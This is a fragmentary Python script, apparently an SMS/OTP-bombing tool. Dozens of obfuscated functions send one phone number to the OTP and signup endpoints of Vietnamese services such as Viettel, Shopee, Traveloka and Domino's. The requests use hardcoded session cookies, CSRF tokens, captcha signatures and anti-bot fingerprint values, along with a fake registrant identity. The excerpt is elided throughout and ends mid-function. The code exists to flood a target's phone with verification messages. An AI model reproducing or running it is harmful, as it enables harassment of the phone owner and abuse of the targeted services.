...
def OooOOo0O0oooO00OO0o0O():
    ...
    middle_name = random.choice(middle_names) if random.choice(
        [True, False]) else ''  # Optional middle name
...
def lIlIlllllllIllIlI(sdt):
    cookies = {
        'laravel_session':
        'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
        'redirectLogin':
        'https://viettel.vn/myviettel',
        'XSRF-TOKEN':
        'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D',
    }
    ...
    headers = {
        ...
        'X-XSRF-TOKEN':
        'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
...
def S2S22SS22SSSSSSSSS2SS(sdt):
    cookies = {
        ...
        'nginx2',
        '_gcl_au':
        '1.1.481698065.1722327865',
        '_tt_enable_cookie':
        '1',
        '_ttp':
        'sCpx7m_MUB9D7tZklNI1kEjX_05',
        '_gid':
        'GA1.2.1931976026.1722327868',
        '_ga_CEMYNHNKQ2':
        'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_8DLTVS911W':
        'GS1.1.1722327866.1.1.1722327876.0.0.0',
        '_ga_R7XKMTVGEW':
        'GS1.1.1722327866.1.1.1722327876.50.0.0',
        '_ga':
        'GA1.2.535777579.1722327867',
        'XSRF-TOKEN':
        '%3D',
        'medicare_session':
...
def OODOOooDoOOoOoOooDD(sdt):
    ...
    cookies = {
        ...
        'NEXT_LOCALE': 'vi',
        'session-id':
        's%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM',
        'device-id':
        's%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg',
        'shared-device-id': 'web_89c04dba-075e-49fe-b218-e33aef99dd12',
        'screen-size':
        's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
    }
    ...
    headers = {
        ...
        'u=1, i',
        'referer':
        'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
...
def JIILIILJJILJJILJIILLJILI(sdt):
    cookies = {
        ...
        '657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=',
        '___utmvm':
        '###########',
        '___utmvc':
    ...
    data = {
        ...
        'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU',
    }
    ...
    json_data = {
        ...
        'variables': {
            'input': {
                ...
                sdt,
                'captchaSignature':
                'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD',
            },
        },
        'query':
...
def llIllIIIIlIlIIlIlIlll(sdt):  # lÃ&nbsp; quÃªn pass á»Ÿ fps Ã¡
    ...
    headers = {
        ...
        'vi,en-US;q=0.9,en;q=0.8',
        'cookie':
        'auth.strategy=; expire_welcome=14400; fpt_uuid=%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22; ajs_group_id=null; G_ENABLED_IDPS=google; CDP_ANONYMOUS_ID=1722362340735; CDP_USER_ID=1722362340735',
        'dnt':
        '1',
        'referer':
        'https://fptplay.vn/',
...
def NMMNNNMMNMMMMNNNM(sdt):
    headers = {
        ...
        'u=1, i',
        'referer':
        'https://vieon.vn/auth/?destination=/&amp;page=/',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
...
def MNMNNNMNMNMNNNMMNNMN(sdt):
    ...
    headers = {
        ...
        'application/json',
        'cookie':
        '__Host-next-auth.csrf-token=14b2514d94fe41605786ef086cffbab297d54c010cdb62c54bc8dad4c84f17ce%7Cf56d91c5542867ff5e83a10d7b0c0b481903f9dfa0917700d5b96641511dd8d8; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'dnt':
        '1',
        'origin':
...
def OO00OoO0o0Oo0ooOOo0OOO0o(sdt):
    ...
    json_data = {
        ...
        sdt,
        'trackingId':
        'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }
...
def Oo0oO0ooooo0O000O0ooO(sdt):
    cookies = {
        ...
        'SPC_R_T_ID':
        'ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=',
        ...
        'SPC_SEC_SI':
        'v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=',
    ...
    headers = {
        ...
        'content-type': 'application/json',
        'cookie':
        '_QPWSDCXHZQA=e7d49dd0-6ed7-4de5-a3d4-a5dddf426740; REC7iLP4Q=312bf815-7526-4121-82bf-61c29691b57f; SPC_F=eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq; REC_T_ID=23f51dde-355f-11ef-bcef-3eebbabc6162; SPC_R_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_R_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; SPC_T_ID=ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=; SPC_T_IV=OGxlR1dmMTU0SlI0cWJPZA==; __LOCALE__null=VN; csrftoken=PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs; SPC_SI=p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=; SPC_SEC_SI=v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=; _sapid=1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45',
        'dnt': '1',
        'origin': 'https://shopee.vn',
        'priority': 'u=1, i',
        'referer':
        'https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
...
def LJIJIILJJJLIJLJJILJ(sdt):
    cookies = {
        'TBMCookie_3209819802479625248':
        '894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
        '___utmvm':
        '###########',
        '___utmvc':
        "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'SvID':
        'beline173|ZqjdK|ZqjdJ',
        'DMX_Personal':
        '%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv':
        '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE':
        'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY',
    }
    ...
    data = {
        ...
        '1',
        '__RequestVerificationToken':
        'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs',
    }
...
def ODoOODODDOOOOOODDoDDOO(sdt):
    cookies = {
        ...
        'XSRF-TOKEN':
        '%3D',
        'sessionid':
        '%3D',
        'utm_uid':
        '%3D',
...
def xwxwxxxxwwxxwwxwxwxxwxx(sdt):
    ...
    headers = {
        ...
        'u=1, i',
        'referer':
        'https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcHxRYpAAAAAIFLshnMlgJN9kcRhs3Df3xg2_jT&amp;co=aHR0cHM6Ly9zcGFjZXQudm46NDQz&amp;hl=vi&amp;v=Xv-KF0LlBu_a0FJ9I5YSlX5m&amp;size=invisible&amp;cb=fo432ewf4lpx',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
    ...
    response = requests.post('https://www.google.com/recaptcha/api2/clr',
                             params=params,
                             cookies=cookies,
                             headers=headers,
                             data=data)
    ...
    response = requests.post('https://api.spacet.vn/www/user/phone',
                             headers=headers,
                             json=json_data)
...
def JLJLLIJJLJLJIIIIJLLLJJJJL(sdt):
    ...
    cookies = {
        '__cf_bm':
        'ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw',
    ...
    headers = {
        ...
        'vi,en-US;q=0.9,en;q=0.8',
        'cookie':
        '__cf_bm=ozzzAEX1uTCa7awrOv_GXKhnlTZ.dm.uvhTIDit6bhM-1722350965-1.0.1.1-hRS2BvNDYVekVNF8Fdj8xDXMw.dMgIn6.pD0cFCg469YWi9TKE9tR4c1d9_o06p1l1b4TCJN_nULYx8ffAfWTw; __cfruid=3f11778af16256a63eb265af0f726daceeb866de-1722350965',
        'dnt':
        '1',
        'priority':
        'i',
        'referer':
        'https://booking.vinpearl.com/vi/login-vpt?callback=vinpearl.com/auth0/sso?redirectUrl=https://vinpearl.com/vi/bo-tui-16-dia-diem-du-lich-ha-long-lam-say-long-du-khach',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
...
def oOOoDDDDoOoDoOoooO(sdt):
    ...
    cookies = {
        ...
        'VN',
        'tv_user':
        '{"authorizationLevel":100,"id":null}',
        'aws-waf-token':
        '98d9a3ce-74ae-4c55-9bc7-7f7bfd38eb33:AAoAv+Nn46QoAAAA:gvxS6OK/WD3sgvZHozCEooVHTXFGAse4BHwX3duvO+1ES7UfgyxW6JHZw/k60EUGp/zHOcObgnYj0450R3SsunEzxE12r6B4nqNXb12qrlWT68DMtNKLE+LXTcI/ssNVkL0bTzMBfZy87typHsUqku8II9EBQ9+yrb4IwvRLQJ+dmRBmjBXZEV/Jnj6ME53ngtZW+cIk0vb0tOi38a7mSK9uZw==',
        'tvl':
        '~djAy',
        'tvs':
        'kOOPm9nR1+er1b8TFCAUgDLEIZ3VFBFIPFWJkFnDJ4stbii+OyDY47kN6Azp58gWhUyymih08uHGt5lhT4PvuwxDSvjXKwvZ/02k2VjAe65GOakasngrQF4EGjnnw3DDuoETUig5QjfQDfgEftAjG85pM6p6TvSU31SizW/I9caAmXpcw3LUVuyTt78y12sZZpeW+OUayg==~djAy',
        '_dd_s':
        'rum=0&amp;expire=1722352252222&amp;logs=1&amp;id=a1a90fe7-fce8-48b0-9100-5f789ab941af&amp;created=1722351314461',
    }
    ...
    headers = {
        ...
        'priority': 'u=1, i',
        'referer':
        'https://www.traveloka.com/vi-vn/explore/destination/kinh-nghiem-du-lich-ha-long-acc/148029',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    ...
    response = requests.post('https://www.traveloka.com/api/v2/user/signup',
                             cookies=cookies,
                             headers=headers,
                             json=json_data)
...
def lIlIIIIIIIIlIlIIlllI(sdt):
    ...
    headers = {
        ...
        '1',
        'ert':
        'DP:f9adae3150090780ee8cfac00fc7cc13',
        'origin':
        'https://dongplus.vn',
        'priority':
        'u=1, i',
        'referer':
        'https://dongplus.vn/user/registration/reg1',
        'rt':
        '2024-07-30T22:25:19+07:00',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
    ...
    response = requests.post('https://api.dongplus.vn/api/v2/user/check-phone',
                             headers=headers,
                             json=json_data)
...
def WWWWWWXWXWXWXXWWW(sdt):
    ...
    headers = {
        ...
        'accept-language': 'vi',
        'access-token':
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'content-length': '0',
        'dnt': '1',
    ...
    response = requests.post('https://tracker.glxplay.io/v1/event',
                             headers=headers,
                             json=json_data)
    print("OTP SEND galaxyplay:", response.text)
...
def xxwxxxxxxxxwwwxwwwxxxxwx(sdt):
    ...
    headers = {
        ...
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':
        'emartsess=30rqcrlv76osg3ghra9qfnrt43; default=7405d27b94c61015ad400e65ba; language=vietn; currency=VND; emartCookie=Y',
        'DNT': '1',
...
def xxwwwxwwwwxwxwwxxx(sdt):
    ...
    headers = {
        'User-Agent':
        "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
        'Accept-Encoding':
        ...
        "vi",
        'imei':
        "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
        'device-name':
        "iPhone",
        'os-version':
        "16.0",
        ...
        "APP",
        'Cookie':
        "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg"
    }
...
def LJJLIILLLILIJIJLLJL(sdt):
    ...
    headers = {
        'User-Agent':
        "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
        'Accept': "application/json",
...
def xwwwwxxxwxwwwxxwxxwxwwx(sdt):
    ...
    params1 = {
        ...
        'app_version': "1.5",
        'package_hash':
        "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
        'label': "v39",
    ...
    payload3 = json.dumps({
        ...
        "query":
        "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
    })
...
def IIIIIIlIIIlIIIIlIllIIIlII(sdt):
    ...
    payload2 = json.dumps({
        ...
        1722417439,
        "signature":
        "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
    })
    ...
    payload3 = json.dumps({
        ...
        1722417441,
        "signature":
        "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
    })
...
def liljliiiijijljljl(sdt):
    ...
    headers = {
        ...
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie':
        'form_key=fm7TzaicsnmIyKbm; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=450982644b33ef1223c1657bb0c43204; form_key=fm7TzaicsnmIyKbm; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1722425411057; private_content_version=e7d88709c6ccef5f8c32a41289ece818',
        'dnt': '1',
        'newrelic':
        'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjA5YWE0NzczZGUzM2IxNTciLCJ0ciI6ImFiMWFmYzBkNDUwMTE1Y2U5ZTE0ZjdhZmZmOTI3MTQ5IiwidGkiOjE3MjI0MjU0NDExMDMsInRrIjoiMTMyMjg0MCJ9fQ==',
        ...
        'sec-fetch-site': 'same-origin',
        'traceparent':
        '00-ab1afc0d450115ce9e14f7afff927149-09aa4773de33b157-01',
        'tracestate':
        '1322840@nr=0-1-4173019-1120237972-09aa4773de33b157----1722425441103',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
...
def NMNMMMMNMNMNMMNMNN(sdt):
    headers = {
        ...
        '1',
        'key':
        '63ea1845891e8995ecb2304b558cdeab',
        'origin':
        'https://reebok.com.vn',
        'priority':
        'u=1, i',
...
def DOooOoOOOODoODoooDO(sdt):
    headers = {
        ...
        '1',
        'key':
        'c3ef5fcbab3e7ebd82794a39da791ff6',
        'origin':
...
def S22SSS2SSSS22222SSS22(sdt):
    headers = {
        ...
        '1',
        'key':
        'ac41e98f028aa44aac947da26ceb7cff',
        'origin':
...
def mmnmmmnmmmmmmmnmmnnmnnmm(sdt):
    headers = {
        ...
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-XSRF-TOKEN':
        '',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
...
def mmnnmnmnnmmmnnmnmmmmm(sdt):
    headers = {
        ...
        'Cookie':
        'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-6owN8knL2LbNscfq8MFTRbw99Sv3SFBfrd1CJOj7uAeEKh6JTpmTaQY6SQyxuO1FiTR7b5yt9vSgof__Zpr9Aiscx8VXG8mf2fhiL19u2aGDm-ekRWdqgJUq_eCLNleE',
        'DNT': '1',
        'Origin': 'null',
    ...
    data = {
        ...
        'BEAUTYBOX12a@',
        'ReturnUrl':
        '/connect/authorize/callback?client_id=vtp.web&amp;secret=vtp-web&amp;scope=openid%20profile%20se-public-api%20offline_access&amp;response_type=id_token%20token&amp;state=abc&amp;redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&amp;nonce=3r25st1hpummjj42ig7zmt',
        'ConfirmOtpType':
        'Register',
        'FormRegister.IsRegisterFromPhone':
        'true',
        '__RequestVerificationToken':
        'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
    }
...
def lIIlllIIIllIIIlIIIIIll(sdt):
    headers = {
        ...
        'Content-Type': 'application/json;charset=UTF-8',
        'Cookie':
        'redirectLogin=https://viettel.vn/myviettel; laravel_session=qCs3S11kNAldWtLh8UYFGYbq6YicwmeargiwDoFy; XSRF-TOKEN=eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ%3D%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        ...
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN':
        'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    ...
    response = requests.post('https://viettel.vn/api/get-otp-contract-mobile',
                             headers=headers,
                             json=json_data)
...
def WWWXXXWWXXXWWWXWWXWXWX(sdt):
    ...
    headers = {
        ...
        'same-site',
        'signature':
        'c5b0d82fae6baaced6c7f383498dfeb5',
        'timestamp':
        '1722427632213',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
...
def IJIILJILJLLLJJLLJLJILII(sdt):
    cookies = {
        'JSESSIONID':
        'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'TS01f67c5d':
        '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'BIGipServerB2C_http':
        '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
        'TS0173f952':
        '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
        'TSPD_101':
        '085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0',
    ...
    data = {
        'memberMap':
        f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyá»…n Quang Ngá»c"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }
...
def SS2S22SSSS2S2SS22SSS(sdt):
    ...
    try:
        response = http.post('https://dominos.vn/api/v1/users/send-otp',
                             headers=headers,
                             json=json_data,
                             timeout=10,
                             stream=False)
        response.raise_for_status(
        )  # Äáº£m báº£o ráº±ng má»i lá»—i HTTP Ä‘Æ°á»£c nÃ¢ng lÃªn
        print("OTP SEND dominos:", response.text)
    except requests.exceptions.ChunkedEncodingError:
        print(
            "OTP SEND dominos: ÄÃ£ xáº£y ra lá»—i mÃ£ hÃ³a Chunked, nhÆ°ng OTP cÃ³ thá»ƒ Ä‘Ã£ Ä‘Æ°á»£c gá»­i."
        )
...
def WXXXXWXWWWXWWWXXWXWXXXXXX(sdt):
    ...
    try:
        ...
        print("Register Response: send_otp_via_mutosi",
              response.json())  # Print the JSON response
    except requests.exceptions.RequestException as e:
...
def MMNMMNMMMNNMNNNMNNN(sdt):
    ...
    try:
        response = requests.post(
            ...
            json=json_data)
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        print("OTP Response send_otp_via_mutosi:",
              response.json())  # Print the JSON response
    except requests.exceptions.RequestException as e:
...
def WWXXWWXWWXXWWXWWWWW(sdt):
    ...
    try:
        response = requests.post(
            ...
            data=data)
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        print("Response send_otp_via_vietair(sdt):",
              response.json())  # Print the JSON response
    except requests.exceptions.RequestException as e:
...
def IILLILJLLLJLIJIJJ(sdt):
    ...
    headers = {
        ...
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie':
        'frontend=173c6828799e499e81cd64a949e2c73a; frontend_cid=7bCDwdDzwf8wpQKE',
        'dnt': '1',
...
def OOooDOOoOODOOOoDOoOo(sdt):
    ...
    headers = {
        'User-Agent':
        "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
        'digest':
        "SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=",
        'x-mof-ods':
        "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
        'x-mof-ds':
        "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
        'device-token':
        "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
        'x-requested-with':
        "XMLHttpRequest",
        'device-id':
        "b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1",
        'accept-language':
        "vi",
        'x-moca-api-version':
        "2",
        ...
        "P_IOS-2.10.156",
        'date':
        "Thu, 01 Aug 2024 13:15:05 GMT",
        'x-request-id':
        "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269",
        'pre-authorization':
        "hmac username=\"06b707de-6050-11eb-ae93-0242ac130002\", algorithm=\"hmac-sha256\", headers=\"date digest\", signature=\"cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw=\""
    }
...
def SS22SSSS22222S2SS2S2S(sdt):
    ...
    headers = {
        ...
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie':
